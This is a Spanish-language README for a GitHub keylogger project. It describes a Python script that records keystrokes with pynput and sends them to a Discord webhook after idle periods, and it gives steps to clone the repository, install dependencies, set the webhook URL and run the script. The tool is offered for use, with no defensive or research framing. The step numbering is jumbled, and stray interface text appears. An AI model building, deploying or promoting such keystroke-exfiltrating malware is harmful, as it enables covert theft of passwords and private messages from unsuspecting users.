# Keylogger Sencillo en Python

Este es un keylogger sencillo programado en Python. El script captura las pulsaciones de teclas y las envía a través de un webhook de Discord. La principal característica de este keylogger es que no envía tecla por tecla, sino que envía los mensajes completos después de un periodo de inactividad.

## Características
- Captura las pulsaciones de teclas.
- Envía las teclas a un webhook de Discord.
- Los mensajes se envían después de un tiempo de inactividad.
- Ignora las teclas modificadoras como Shift, Ctrl, etc.

## Requisitos
- Python 3.x
- Librerías:
  - `pynput`
  - `requests`

## Instalación
1. Clona este repositorio:
   ```bash
   git clone https://github.com/IXxDarknessxXI/keylogger.git


1. Instala las dependencias:

bash
Copiar
Editar
pip install pynput requests

3. Modifica la URL del webhook de Discord en el código (en la variable WEBHOOK_URL).

2. Ejecuta el script:

bash
Copiar
Editar
python keylogger.py
